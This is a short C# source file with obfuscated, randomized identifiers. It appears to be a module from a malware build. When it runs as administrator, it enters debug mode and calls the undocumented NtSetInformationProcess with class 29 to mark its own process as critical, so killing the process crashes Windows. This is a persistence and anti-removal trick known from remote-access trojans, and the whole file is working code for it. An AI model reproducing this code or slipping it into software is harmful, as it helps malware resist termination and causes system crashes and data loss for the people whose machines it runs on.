using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace YzTymtbtgFABHvJvj;

public static class vmUKXHgePAyzJ
{
	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr cwCNXOMFrWezq, int ONkdazPbMerydP, ref int yjVwxxKtULQHSD, int MoMdjkRlOl);

	public static void YJXDeROPCnIyoH()
	{
		if (DICqAxqZDleFwHj())
		{
			rxsHwzARDaccp();
		}
	}

	public static void rxsHwzARDaccp()
	{
		int yjVwxxKtULQHSD = 1;
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref yjVwxxKtULQHSD, 4);
	}

	public static bool DICqAxqZDleFwHj()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}
}
